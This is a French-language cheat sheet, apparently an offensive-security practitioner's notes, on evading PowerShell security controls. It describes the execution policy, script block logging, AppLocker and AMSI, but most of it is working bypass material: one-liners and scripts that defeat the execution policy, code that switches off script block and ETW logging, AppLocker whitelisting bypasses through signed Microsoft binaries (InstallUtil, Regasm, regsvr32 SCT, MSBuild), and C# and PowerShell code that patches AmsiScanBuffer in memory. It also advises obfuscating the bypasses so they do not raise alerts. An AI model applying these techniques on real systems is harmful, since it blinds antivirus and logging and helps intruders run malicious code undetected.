# Powershell protections & contournements

1. [Politique d'execution](#politique-d'execution)
2. [Contourner une politique d’exécution restrictive](#Contourner-une-politique-d’exécution-restrictive)
	1. [Invoke-Expression](#invoke-expression)
 	2. [Utilisation de la politique Bypass](#utilisation-de-la-politique-bypass)
 	3. [Annulation du AuthorizationManager](#annulation-du-authorizationmanager)
3. [Moyens de détections](#moyens-de-détections)
 	1. [PowerShell Transcript](#powershell-transcript)
 	2. [PowerShell Script Block Logging](#powershell-script-block-logging)
 	3. [Deep script block logging](#deep-script-block-logging)
4. [Contournements des moyens de détections](#contournements-des-moyens-de-détections)
 	1. [Unmanaged PowerShell](#unmanaged-powershell)
 	2. [Contournement du script block logging](#contournement-du-script-block-logging)
  	3. [Version inférieure de PowerShell](#Version-inférieure-de-powershell)
5. [Environnements durcis](#environnements-durcis)
 	1. [Listes blanches et mode de langage contraint](#listes-blanches-et-mode-de-langage-contraint)
6. [Techniques de contournement](#techniques-de-contournement)
 	1. [Backdoor extension](#backdoor-extension)
 	2. [Mode de verrouillage AppLocker](#mode-de-verrouillage-applocker)
 	3. [Weak path rules](#weak-path-rules)
 	4. [rundll32](#rundll32)
 5. [Binaires Microsoft signés](#binaires-microsoft-signés)
    1. [CSC](#csc)
    2. [MSBuild](#msbuild)
    3. [Regsvr32](#regsvr32)
    4. [Regasm et Regsvcs](#regasm-et-regsvcs)
    5. [InstallUtil](#installutil)
  6. [Version inférieure de PowerShell](#version-inférieure-de-powershell)
7. [AMSI](#amsi)
 	1. [Principes de fonctionnements](#principes-de-fonctionnements)
	    1. [PowerShell](#powershell)
	    2. [VBA](#vba)
	    3. [JScript et VBScript](#jscript-et-vbscript)
	2. [Contournements possible](#contournements-possible)
		1. [Powershell](#powershell)
			1. [Version inférieur](#version-inférieur)
			2. [Recompilation](#recompilation)
			3. [ScriptBlockAST](#scriptblockast)
			4. [Patching de la mémoire](#patching-de-la-mémoire)
				1. [1er méthode](#1er-méthode)
				2. [2em méthode](#2em-méthode)
			5. [Exemples](#exemples)
				1. [Patch DLL amsi en C sharp](#patch-dll-amsi-en-c-sharp)
				2. [Script Powershell utilisant Add-Type](#script-powershell-utilisant-add-type)
			6. [Obfuscation](#obfuscation)
		2. [VBA](#vba)
      			1. [Excel XLM](#excel-xlm)
		3. [JScript et VBScript](#jscript-et-vbscript)
			1. [Registre](#registre)
			2. [WScript et COM events](#wscript-et-com-events)
8. [Bibliographie](#bibliographie)

# Politique d'execution

Permet de définir les conditions d’exécution de scripts PowerShell 

- `AllSigned, Bypass, Default, RemoteSigned, Restricted, Undefined, Unrestricted`

- Politique par défaut des postes Windows : Restricted
    - Seules les commandes PowerShell puissent être exécutées
- Politique par défaut des serveurs Windows : RemoteSigned
    - Exécuter les scripts PowerShell. Les scripts provenant d’Internet doivent être signés par un éditeur approuvé

# Contourner une politique d’exécution restrictive
## Invoke-Expression

Permet d’exécuter des scripts PowerShell peu importe le niveau de restriction mis en place via la politique d’exécution

- `Get-Content .\<path>\<file>.ps1 | Invoke-Expression`

Scripts bat :

- `cmd.exe /K < payload.bat`

## Utilisation de la politique Bypass

Permet à un utilisateur d’exécuter n’importe quel script PowerShell

- `powershell -ExecutionPolicy Bypass`

- `powershell -nop -exec bypass -c <POWERSHELL_COMMAND>`

## Annulation du AuthorizationManager

Classe permettant de contrôler/restreindre l’exécution des commandes PowerShell dans un contexte précis.

En implémentant une fonction mettant à `null` la classe `AuthorizationManager` dans la session PowerShell courante, la politique d’exécution devient automatiquement `Unrestricted`

```powershell
function Disable-ExecutionPolicy {($ctx = $executioncontext. gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager", "nonpublic,instance").setvalue($ctx, (new-object System.Management. Automation.AuthorizationManager "Microsoft.PowerShell"))}
```

# Moyens de détections

##  PowerShell Transcript

`Start-Transcript` est une cmdlet depuis PowerShell v2 qui enregistre les commandes d’une session PowerShell dans un fichier texte

Le fichier contient en plus des informations telles que le nom de l’utilisateur, l'horodatage, le résultat de la commande

Ce fichier de journalisation peut être stocké sur un serveur distant
	
`Start-Transcript` peut être activé via la GPO `Activer la transcription PowerShell`

## PowerShell Script Block Logging

Journalisation des blocs de scripts PowerShell, peut être activé via GPO `Turn on PowerShell Script Block Logging`

Un script block correspond à tout type de commande PowerShell pouvant être exécuté

Lorsque du code PowerShell est exécuté, chaque instruction présente dans celui-ci va être journalisée. 

Les instructions PowerShell sont journalisées au cours de leur exécution, ainsi les instructions obfusquées sont journalisées dans un format pouvant être facilement lisible

Les journaux du script block logging sont présents au sein du gestionnaire d’événements Windows

## Deep script block logging

Mécanisme permettant de journaliser automatiquement des instruction même si la stratégie de script block logging n’est pas implémentée à partir de Powershell v5.

Lorsque des instructions PowerShell considérées comme étant suspicieuses par le système sont exécutées, celles-ci sont enregistrées

Les instructions considérées comme étant suspicieuses par le système correspondent à des commandes PowerShell exécutant du code généré dynamiquement

# Contournements des moyens de détections
## Unmanaged PowerShell

Les processus surveillés pour exécuter du PowerShell sont généralement `powershell.exe` et `powershell_ise.exe`

`powershell.exe` charge la librairie .NET `System.Management.Automation` et fait appel à ses fonctions permettant d’évaluer des expressions PowerShell

Il est possible d’exécuter du PowerShell depuis n’importe quel autre processus tant qu'il charge la librairie `System. Management.Automation`. Par exemple, une DLL contenant du code PowerShell et faisant appel aux fonctions de la librairie `System.Management.Automation` pour exécuter ce même code pourrait être injectée dans la mémoire d’un processus légitime.

- https://github.com/leechristensen/UnmanagedPowerShell

## Contournement du script block logging

Le script block logging correspond à une GPO permettant de journaliser chaque instruction PowerShell exécutée à chaque fois qu’une instruction PowerShell va être exécutée, PowerShell va vérifier dans son cache si le script block logging est mis en place ou non

La valeur mise en cache par PowerShell permettant d’identifier l’implémentation de la GPO est accessible en écriture par un simple utilisateur ayant ouvert une session PowerShell

Il est possible avec un morceau de code de réécrire les valeurs mises en cache dans le but de forcer la désactivation du script block logging pour la session courante

```powershell
$GroupPolicyField = [ref].Assembly.GetType('System.Management.Automation.Utils')."GetFie`ld"('cachedGroupPolicySettings', 'N'+'onPublic,Static')
If ($GroupPolicyField) {
    $GroupPolicyCache = $GroupPolicyField.GetValue($null)
    If ($GroupPolicyCache['ScriptB'+'lockLogging']) {
        $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0
        $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0
    }
    $val = [System.Collections.Generic.Dictionary[string,System.Object]]::new()
    $val.Add('EnableScriptB'+'lockLogging', 0)
    $val.Add('EnableScriptB'+'lockInvocationLogging', 0)
    $GroupPolicyCache['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging'] = $val
}
```

- Source : https://cobbr.io/ScriptBlock-Logging-Bypass.html
- Source : https://gist.github.com/cobbr/d8072d730b24fbae6ffe3aed8ca9c407

Assigner une valeur nulle à une instance de la classe EventProvider chargée de journaliser les évènements PowerShell :

```powershell
$EtwProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static');
$EventProvider = New-Object System.Diagnostics.Eventing.EventProvider -ArgumentList @([Guid]::NewGuid());
$EtwProvider.SetValue($null, $EventProvider);
```

- Source : https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs

Les instructions PowerShell permettant de contourner le script block logging vont tout de même être journalisées et cela va donc générer une alerte
	- Obfusquer le code permettant de contourner cette stratégie au préalable


##  Version inférieure de PowerShell

La version 2 n’est pas compatible avec les mesures de sécurité et de journalisation

Vérifier si v2 est installée :

- `reg query HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine`

Sur Windows 10, il est généralement nécessaire d’installer au préalable la version 2.0.50727 du framework .NET
	
- `PowerShell.exe -Version 2`    

# Environnements durcis

DeviceGuard/AppLocker permettront, via la définition de règles de stratégies, d’autoriser ou non l’exécution d’une application sur le système

## Listes blanches et mode de langage contraint

Exécution des applications powershell.exe et powershell_ise.exe interdite

PowerShell  exécuté en mode de langage contraint (CLM pour Constrained Language Mode). Permet de prendre en charge les tâches administratives quotidiennes, en limitant l’accès aux éléments de langage sensibles (appel à l’API Windows ou le chargement d’un script en mémoire par exemple)

#  Techniques de contournement
## Backdoor extension

Utilisation de l'outil Nishand pour générer divers type de fichier exécutable contenant du code Powershell

- HTA : `Out-HTA -Payload "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c <POWERSHELL_COMMANDE>"`
- CHM : `Out-CHM -Payload "<POWERSHELL_COMMANDE>" -HHCPath "<PATH_FOLDER_CONTAINING_HTM_FILE>"`
    - `C:\Program Files (x86)\HTML Help Workshop`
- LNK : ` Out-Shortcut -Payload "-WindowStyle hidden -ExecutionPolicy Bypass -noprofile -noexit -c <POWERSHELL_COMMANDE>"`

- Autres possibilités : https://github.com/samratashok/nishang/tree/master/Client

## Mode de verrouillage AppLocker

PowerShell obtient le répertoire temporaire de l’utilisateur dans lequel créer les fichiers à partir des variables d’environnement

Les règles par défaut d’AppLocker autorisent l’exécution de scripts depuis C:\Windows\*

En remplaçant le répertoire temporaire de l’utilisateur par C:\Windows\temp dans la variable d’environnement et en exécutant PowerShell, les scripts vérifiant la politique AppLocker seront exécutés avec succès. La session sera alors en mode de langage complet
	
Méthode présente dans le script https://github.com/api0cradle/PowerAL

## Weak path rules

```powershell
Get-ChildItem C:\Windows -Filter ABCtestfile.exe -Recurse -ErrorAction SilentlyContinue | Remove-Item -ErrorAction SilentlyContinue

foreach($_ in (Get-ChildItem C:\Windows -recurse -ErrorAction SilentlyContinue)){
    if($_.PSIsContainer)
    {
        Set-Location $_.FullName
        Copy-Item "C:\Windows\System32\mstsc.exe" .\ABCtestfile.exe -ErrorAction SilentlyContinue
        if (Test-Path -Path .\ABCtestfile.exe)
            {
            Write-Host "Trying to execute in writable folder" $_.FullName -ForegroundColor Yellow
            Start-Process  .\ABCtestfile.exe
            }
    }
}

Write-Host "The following paths allow write (and read)" -ForegroundColor Green
Get-ChildItem C:\Windows -Filter ABCtestfile.exe -Recurse -ErrorAction SilentlyContinue | Select-Object FullName | Format-Table -AutoSize

Write-Host "The following paths allow write and execute" -ForegroundColor Green
(Get-Process ABCtestfile).MainModule | select FileName

Stop-Process -Name ABCtestfile -Force
```

https://github.com/3gstudent/Bypass-Windows-AppLocker/blob/master/AppLockerBypassChecker-v1.ps1

## rundll32

- `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c <POWERSHELL_PAYLOAD>")`

## Binaires Microsoft signés

Il est possible d’exécuter des commandes PowerShell par le biais de code C#

La classe Pipeline en C# permet de contourner le mode de langage contraint

```powershell
using System;
using System.Management.Automation;

namespace PowerShellExecutor
{
    class Program
    {
        static void Main(string[] args)
        {
            PowerShell ps = PowerShell.Create();
            ps.AddCommand("Invoke-Expression");
            ps.AddArgument("<PAYLOAD>");
            ps.Invoke();
        }		
    }
}
```

Compilation du C# et utilisation de binaires Microsoft signés permettra de passer outre la liste blanche d’applications

### CSC

- `C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /reference:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll .\<FILE>.cs`
    - Deux chemins possible pour System.Management.Automation
        - C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
        - C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
- `.\<FILE>.exe`

### MSBuild

`Microsoft Build Engine` : Plateforme de génération d’applications utilisée par Visual Studio pour charger et générer des projets managés (.csproj). Il est possible d’insérer du code C# dans la structure XML de ces fichiers
    - https://github.com/Cn33liz/MSBuildShell
    - https://github.com/Mr-Un1k0d3r/PowerLessShell

### Regsvr32

`Register Server` : Inscrit les fichiers. dll en tant que composants de commande dans le registre.

- SCT file : Script used to create a Component Object Model (. COM) component
    - Code in the `<registration>` tag is executed as part of the server registration/unregistration process

```XML
<?XML version="1.0"?>
<scriptlet>
<registration 
    progid="ShortJSRAT"
    classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
	<script language="JScript">
		<![CDATA[
            var r = new ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c <POWERSHELL_COMMAND>",0,true);
		]]>
</script>
</registration>
</scriptlet>
```

- `regsvr32 /u /n /s /i:<FILE>.sct scrobj.dll`
    - Scrobj.dll is used to register and unregister COM objects

### Regasm et Regsvcs

Regsvcs.exe : L'outil .NET Services Installation (Installation des services .NET)

Regasm.exe : L'outil Assembly Registration Tool (Inscription de l'assembly) lit les métadonnées figurant dans un assembly et ajoute les entrées nécessaires au Registre

```C#
using System;
using System.EnterpriseServices;
using System.Runtime.InteropServices;
using System.Management.Automation;
namespace regsvcser
{
    
    public class Bypass : ServicedComponent
    {

        static void Main(string[] args)
        {
        }		
		
        public Bypass() { Console.WriteLine("I am a basic COM Object"); }
		
		[ComUnregisterFunction] //This executes if registration fails
		public static void UnRegisterClass ( string key )
		{
			PowerShell ps = PowerShell.Create();
			ps.AddCommand("Invoke-Expression");
			ps.AddArgument("<POWERSHELL_PAYLOAD>");
			ps.Invoke();	
		}
    }

}
```
- Création de la clé pour le Strong Name
    - `$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY7
    6JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='`
    - `$Content = [System.Convert]::FromBase64String($key)`
    - `Set-Content key.snk -Value $Content -Encoding Byte`

- Compiler avec csc.exe : `C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /reference:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /target:library /out:<FILE>.dll /keyfile:key.snk .\<FILE>.cs`
- Exécuter avec Regasm.exe :  `C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U .\<FILE>.dll`
- Exécuter avec Regsvcs.exe : ?

### InstallUtil

Peut charger et exécuter du code C# dans son propre processus par le biais de ses fonctions d’installation ou de désinstallation la fonction de désinstallation qui peut être appelée par un utilisateur non privilégié.


```C#
using System;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;
 
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;
 
    public class Program
    {
        public static void Main()
        {
            Console.WriteLine("Main function");
             
        }
         
    }
     
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
             
            while(true)
            {
                string x = Console.ReadLine();
                Console.WriteLine(RunPSCommand(x));
                 
            }
             
        }

        public static string RunPSCommand(string cmd)
        {
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
            Pipeline pipeline = runspace.CreatePipeline();
 
            pipeline.Commands.AddScript(cmd);
 
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();
 
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
         }
          
         public static string RunPSFile(string cmd)
        {
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
            Pipeline pipeline = runspace.CreatePipeline();
 
            pipeline.Commands.AddScript(cmd);
 
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();
 
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }
    }
```

- Source : https://github.com/re4lity/subTee-gits-backups/blob/master/InstallUtil-PowerShell.cs 

Compiler le code puis l’exécuter

- `C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe  /reference:"C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /out:mypowershell.exe <FILE>.cs`

- `C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /U .\<FILE>.exe`

InstallUtil.exe output 

```powershell
Microsoft (R) .NET Framework Installation utility Version 4.8.3761.0
Copyright (C) Microsoft Corporation.  All rights reserved.
The uninstall is beginning.
See the contents of the log file for the C:\Users\slachkar\Documents\PARTAGE VM\SHARED\TOOLS\Powershell\BypassHardening\installUI\installUI.exe assembly's progress.
The file is located at C:\Users\slachkar\Documents\PARTAGE VM\SHARED\TOOLS\Powershell\BypassHardening\installUI\installUI.InstallLog.
Uninstalling assembly 'C:\Users\slachkar\Documents\PARTAGE VM\SHARED\TOOLS\Powershell\BypassHardening\installUI\installUI.exe'.
Affected parameters are:
   logtoconsole =
   logfile = C:\Users\slachkar\Documents\PARTAGE VM\SHARED\TOOLS\Powershell\BypassHardening\installUI\installUI.InstallLog
   assemblypath = C:\Users\slachkar\Documents\PARTAGE VM\SHARED\TOOLS\Powershell\BypassHardening\installUI\installUI.exe
Get-ExecutionPolicy
RemoteSigned
```

## Version inférieure de PowerShell

- `PowerShell.exe -Version 2`

# AMSI

Présente à partir de Windows 10. Permet l’interaction entre langages de scripting et antivirus.

Quand une application veut procéder à l’inspection d’un contenu par un antivirus, elle fait appel à l’AMSI. L’interface redistribu ensuite le contenu à analyser vers les
différents antivirus inscrits auprès d’elle.

Une application peut demander l’inspection de chaque instruction (avant exécution) et interrompre le script dans le cas d’une détection. En cas d’obfuscation, les antivirus auront accès aux instructions sous forme lisible.

- AMSI est déjà utilisée par divers applications/composants sur Windows 10 :
    - PowerShell ;
    - JScript et VBScript ;
    - VBA (macros Office) ;
    - UAC (élévation d’EXE, COM, MSI ou installation de composants ActiveX).
	
- Plusieurs AV supportent déjà l'AMSI : 
    - Windows Defender
    - AVG
    - BitDefender
    - ESET
    - Dr Web
    - Avast
    - Kaspersky
    - CrowdStrike Falcon
    - McAfee

## Principes de fonctionnements
### PowerShell

L'AMSI est implémentée dans une DLL amsi.dll, chargée dans l'espace mémoire de Powershell. AMSI est chargée pour toutes les instances Powershell, admin/user.

Dans PowerShell un objet ScriptBlock représente une instruction. Un objet ScriptBlock contient l’Abstract Syntax Tree (AST) qui permet de décrire les éléments consituant de l'instruction (paramétres ...)

`ReallyCompile()` permet de compiler l'AST en instruction exécutable.

La fonctionn `PerformSecurityChecks()` est appelée à chaque compilation de ScriptBlock. L'AMSI aura accés aux différentes étapes de désobfuscation pendant l'exécution

### VBA

Des logs sont générés lors de l'exécution d'instructions. Ces logs sont transmis à l'AMSI dans le cas d'utilisation de fonction considérées comme dangeureuses.

La fonction `PerformSecurityChecks()` vérifie si l’instruction en cours est dans la liste des fonctions dangeureuses.
- VBA Shell ou CallByName ;
- Méthode d’un objet COM ;
- API Win32 importée dynamiquement.

La liste complète des fonctions VBA considérées comme dangeureuses : https://www.github.com/Synacktiv/AMSI-Bypass

Les hooks AMSI sont présent au sein de VBE7.DLL

### JScript et VBScript

Le JScript et le VBScript peuvent être exécuté à travers l'utilisation de cscript.exe.

L'AMSI est intégrée au sein de jscript.dll et vbscript.dll avec le même fonctionnement que pour VBA. 

## Contournements possible
### Powershell 
#### Version inférieur

L’AMSI a été implémentée dans PowerShell à partir de la version 3. Possible de la contourner totalement en utilisant une version inférieure (Disponible sur Windows 10) : 

`powershell.exe -Version 2`

#### Recompilation

Recompiler PowerShell sans les hooks de sécurité, nécessite de déposer un binaire sur la cible.

#### ScriptBlockAST
	
L'appel vers l'AMSI au sein de PowerShell se trouve avant la compilation du ScriptBlock. Seule la version de l'AST sera accessible. L'AST représente chaque chaine de caractères par un object distinct nommé `StringConstantExpressionAst`. 

Dans ce context, la concaténation des chaines peut permettre de contourner les signatures AV. Ex : `Invoke-Obfuscation`

#### Patching de la mémoire
##### 1er méthode

Manipuler le contenus de la variable `amsiInitFailed`. 

Contient le résultat de l’initialisation d’AMSI au sein du processus. Elle sert d’indicateur à `WinScanContent()` afin de déterminer si l’analyse	doit être réalisée.

##### 2em méthode    

Patcher la DLL `amsi.dll` qui se situe en userland dans le processus powershell.exe. Il est donc possible d’accéder à ses pages mémoires et de patcher son code.

Modifier la fonction `AmsiScanBuffer()` afin de lui faire simuler une erreur 

#### Exemples
##### Patch DLL amsi en C sharp

```C#
using System;
using System.Runtime.InteropServices;

namespace Bypass
{
    public class AMSI
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);


        public static int Disable()
        {
            IntPtr TargetDLL = LoadLibrary("amsi.dll");
            if (TargetDLL == IntPtr.Zero)
            {
                Console.WriteLine("ERROR: Could not retrieve amsi.dll pointer.");
                return 1;
            }

            IntPtr AmsiScanBufferPtr = GetProcAddress(TargetDLL, "AmsiScanBuffer");
            if (AmsiScanBufferPtr == IntPtr.Zero)
            {
                Console.WriteLine("ERROR: Could not retrieve AmsiScanBuffer function pointer");
                return 1;
            }

            UIntPtr dwSize = (UIntPtr)5;
            uint Zero = 0;
            if (!VirtualProtect(AmsiScanBufferPtr, dwSize, 0x40, out Zero))
            {
                Console.WriteLine("ERROR: Could not change AmsiScanBuffer memory permissions!");
                return 1;
            }

            /*
             * This is a new technique, and is still working.
             * Source: https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/
             */
            Byte[] Patch = { 0x31, 0xff, 0x90 };
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(Patch, 0, unmanagedPointer, 3);
            MoveMemory(AmsiScanBufferPtr + 0x001b, unmanagedPointer, 3);

            Console.WriteLine("AmsiScanBuffer patch has been applied.");
            return 0;
        }
    }
}
```

- Compile a C# DLL with code
- Then we will load and execute this code in a PowerShell session will disable AMSI
	- Load DLL : `PS C:\> [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("<PATH>\\BypassAMSI.dll"))`
	- Check if well loaded (namespace.class (cf code source)) : `PS C:\> [Bypass.AMSI]`
	- Call the function (namespace.class.function (cf code source)) : `PS C:\> [Bypass.AMSI].Disable()`
		

##### Script Powershell utilisant Add-Type

- `Add-Type` : The Add-Type cmdlet lets you define a Microsoft .NET Core class in your PowerShell session

```powershell
$Source = @"
using System;
using System.Runtime.InteropServices;

namespace BypassSAJISAJIA
{
    public class AMSISAJISAJIA
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);


        public static int Disable()
        {
            IntPtr TargetDLL = LoadLibrary("amsi.dll");
			
            IntPtr ASBPtr = GetProcAddress(TargetDLL, "Am"+ "si" + "Scan" + "Buffer");
            			
			// more resilient against future modifications to amsi.dll by Microsoft
			Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
			IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
			Marshal.Copy(Patch, 0, unmanagedPointer, 6);
			MoveMemory(ASBPtr, unmanagedPointer, 6);

            return 0;
        }
    }
}
"@

Add-Type -TypeDefinition $Source -Language CSharp;
```

Commandes : 

```powershell
PS C:\> .\A.M.S.I_Bypass.ps1
PS C:\> [BypassSAJISAJIA.AMSISAJISAJIA]
	IsPublic IsSerial Name                                     BaseType
	-------- -------- ----                                     --------
	True     False    AMSISAJISAJIA                            System.Object
PS C:\> [BypassSAJISAJIA.AMSISAJISAJIA]::Disable()
```

#### Obfuscation

- Le mot `amsiutils”` est bannis. 
    - Concaténation : `"ams"+"iutils"`
    - Base64 : 
    ```powershell
    $test = "ams"+"iutils"
	$test_b64 = [Convert]::ToBase64String([Text.encoding]::UTF8.GetBytes($test))
	[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($test_b64))
    ```    

- Invoke-Obfuscation
- Invoke-CradleCrafter

### VBA

Possible de rester invisible en esquivant les fonctions triggers

####  Excel XLM

Excel possède un second moteur de macros appelé XLM ne reposant pas sur VBA. Le développement a été abandonné après Excel v4.0, mais est disponible (rétrocompatibilité) dans la version 2019.
	
Les macros XLM ont la possibilité d’interagir avec les API Win32. L’AMSI n’y étant pas implémentée, les antivurus n’auront aucune vue sur le contenu de la macro lors de son exécution.

###  JScript et VBScript
#### Registre

La fonction `JAmsiEnabledByRegistry()` durant l'initialisation de l’AMSI vérifie la valeur de la clé `HKCU\SOFTWARE\Microsoft\Windows Script\Settings\AmsiEnable` afin de déterminer si AMSI est activé sur le système. 

L’utilisateur courant peut modifier la valeur de cette clé afin de la fixer à 0, HKCU est accessible en écriture. Uniqument lors de l’initialisation
	
Utilisée par l’outil `SharpShooter` (module `amsikiller.py`)

#### WScript et COM events

Le mécanisme suivant perturbe l’AMSI et rend le contenu des fonctions connectées invisible

```vb
var ie = WScript.CreateObject('InternetExplorer.Application', 'ie_');

function ie_OnQuit() {
	Wscript.Echo('Quit!');
}
```

La fonction `CreateObject(strProgID[,strPrefix])` via l'objet `WScript` permet d'instancier un objet et de lui associer un préfixe.

Suite à la création de l’objet, les fonctions nommées avec ce préfixe lui seront directement rattachées

# Bibliographie

- MISC 104 : Évolution de la sécurité de PowerShell et techniques de contournement
- MISC 104 : AMSI : fonctionnement et contournements


- https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html
- https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
- https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
- https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html
- https://rastamouse.me/2018/10/amsiscanbuffer-bypass---part-1/
- https://rastamouse.me/2018/10/amsiscanbuffer-bypass---part-2/
- https://rastamouse.me/2018/11/amsiscanbuffer-bypass-part-3/
- https://www.digitalshadows.com/blog-and-research/powershell-security-best-practices/


- https://github.com/re4lity/subTee-gits-backups/blob/master/InstallUtil-PowerShell.cs
- https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/master/ASBBypass.ps1
- https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
- https://github.com/cobbr/PSAmsi
